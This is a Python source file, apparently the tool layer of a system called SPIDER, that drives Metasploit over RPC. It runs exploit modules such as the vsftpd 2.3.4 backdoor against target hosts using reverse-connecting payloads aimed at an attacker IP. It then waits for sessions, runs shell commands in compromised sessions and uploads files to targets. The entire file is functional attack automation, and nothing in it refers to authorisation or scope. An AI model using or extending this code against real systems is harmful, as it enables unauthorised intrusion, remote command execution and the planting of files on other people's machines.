"""
SPIDER — Metasploit RPC Tool Wrapper
Uses pymetasploit3 to connect to msfrpcd and execute exploits.
"""

from __future__ import annotations

import time


class MSFConnectionError(Exception):
    pass


class ExploitFailedError(Exception):
    pass


class SessionDeadError(Exception):
    pass


def get_msf_client():
    """
    Create and return a connected MsfRpcClient.
    Raises MSFConnectionError if connection fails.
    """
    from spider.config import MSF_RPC_HOST, MSF_RPC_PORT, MSF_RPC_PASSWORD, MSF_RPC_SSL

    try:
        from pymetasploit3.msfrpc import MsfRpcClient
        client = MsfRpcClient(
            MSF_RPC_PASSWORD,
            server=MSF_RPC_HOST,
            port=MSF_RPC_PORT,
            ssl=MSF_RPC_SSL,
        )
        return client
    except ImportError:
        raise MSFConnectionError(
            "pymetasploit3 is not installed. Run: pip install pymetasploit3"
        )
    except Exception as e:
        raise MSFConnectionError(f"Failed to connect to msfrpcd: {e}")


def check_msfrpcd() -> bool:
    """Check if msfrpcd is reachable. Returns True/False (never raises)."""
    try:
        get_msf_client()
        return True
    except Exception:
        return False


def run_exploit(
    module_path: str,
    options: dict,
    payload: str,
    lhost: str,
    lport: int = 4444,
    timeout: int = 30,
) -> dict:
    """
    Execute a Metasploit exploit module.
    
    Args:
        module_path: Metasploit module path (e.g. "exploit/unix/ftp/vsftpd_234_backdoor")
        options: Dict of module options (RHOSTS, RPORT, etc.)
        payload: Payload string (e.g. "cmd/unix/interact")
        lhost: Attacker IP for reverse connections
        lport: Listener port (default 4444)
        timeout: Seconds to wait for session
    
    Returns:
        Dict with: {success, session_id, session_type, error}
    
    Raises:
        MSFConnectionError: Cannot reach msfrpcd
        ExploitFailedError: Module ran but no session opened
    """
    client = get_msf_client()

    try:
        exploit = client.modules.use("exploit", module_path)

        # Set all provided options
        for key, val in options.items():
            exploit[key] = val

        # Set up payload
        payload_obj = client.modules.use("payload", payload)
        payload_obj["LHOST"] = lhost
        payload_obj["LPORT"] = lport

        # Execute
        result = exploit.execute(payload=payload_obj)

        if not result:
            raise ExploitFailedError(f"Module {module_path} returned no result")

        # Wait for session to appear
        session_id = None
        for _ in range(timeout):
            sessions = client.sessions.list
            if sessions:
                session_id = max(int(k) for k in sessions.keys())
                break
            time.sleep(1)

        if session_id is None:
            raise ExploitFailedError(
                f"Module {module_path} executed but no session was opened after {timeout}s"
            )

        session_info = client.sessions.list.get(str(session_id), {})
        return {
            "success": True,
            "session_id": session_id,
            "session_type": session_info.get("type", "shell"),
            "target_ip": session_info.get("target_host", options.get("RHOSTS", "")),
            "username": session_info.get("username", ""),
            "hostname": session_info.get("target_host", ""),
            "os_info": session_info.get("platform", ""),
            "error": None,
        }

    except ExploitFailedError:
        raise
    except MSFConnectionError:
        raise
    except Exception as e:
        raise ExploitFailedError(f"Exploit execution error: {e}")


def run_session_command(session_id: int, command: str, timeout: int = 30) -> str:
    """
    Run a shell command in an existing Metasploit session.
    
    Returns:
        Command output as string.
    
    Raises:
        SessionDeadError: Session is no longer alive.
    """
    client = get_msf_client()

    sessions = client.sessions.list
    if str(session_id) not in sessions:
        raise SessionDeadError(f"Session {session_id} is no longer alive")

    try:
        session = client.sessions.session(str(session_id))
        session.write(command + "\n")
        time.sleep(2)  # Allow command to execute
        output = session.read()
        return output or ""
    except Exception as e:
        raise SessionDeadError(f"Session {session_id} died: {e}")


def upload_file_to_session(session_id: int, local_path: str, remote_path: str) -> bool:
    """
    Upload a local file to the target via Meterpreter session.
    Returns True on success.
    """
    client = get_msf_client()

    sessions = client.sessions.list
    if str(session_id) not in sessions:
        raise SessionDeadError(f"Session {session_id} is no longer alive")

    try:
        session = client.sessions.session(str(session_id))
        # Meterpreter upload command
        session.write(f"upload {local_path} {remote_path}\n")
        time.sleep(3)
        output = session.read()
        return "uploaded" in output.lower() or "uploading" in output.lower()
    except Exception as e:
        raise SessionDeadError(f"Upload failed: {e}")
